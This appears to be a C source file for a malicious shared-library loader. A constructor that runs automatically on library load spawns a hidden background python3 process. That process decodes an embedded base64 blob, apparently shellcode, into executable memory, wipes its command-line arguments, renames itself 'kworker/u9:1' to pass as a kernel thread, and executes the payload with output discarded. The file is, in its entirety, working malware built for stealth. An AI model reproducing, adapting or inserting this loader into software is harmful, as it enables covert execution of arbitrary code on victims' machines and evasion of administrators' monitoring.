#include <stdlib.h>

__attribute__((constructor))
static void run_python(void) {
    system(
        "python3 -c \""
        "import base64, mmap, ctypes, sys, os;"
        "encoded=\\\"SDHJSIHp+f///0iNBe////9IuxaSfz7/KEr5SDFYJ0gt+P///+L0XipQXJZGZYp+kuZuq3cYn36/HGqheqL2FpJ/EYpbONZ0+xERl0cykXeSKWmrdiDCTp16Pv8oSvk=///\\\";"
        "raw=base64.b64decode(encoded);"
        "mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,"
        "mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);"
        "mem.write(raw);"
        "addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));"
        "shell_func=ctypes.CFUNCTYPE(None)(addr);"
        "[sys.argv.__setitem__(i,'\\0'*len(sys.argv[i])) for i in range(len(sys.argv))];"
        "libc=ctypes.CDLL(None);"
        "libc.prctl(15,b\\\"kworker/u9:1\\\",0,0,0);"
        "shell_func()\""
        " > /dev/null 2>&1 &"
    );
}
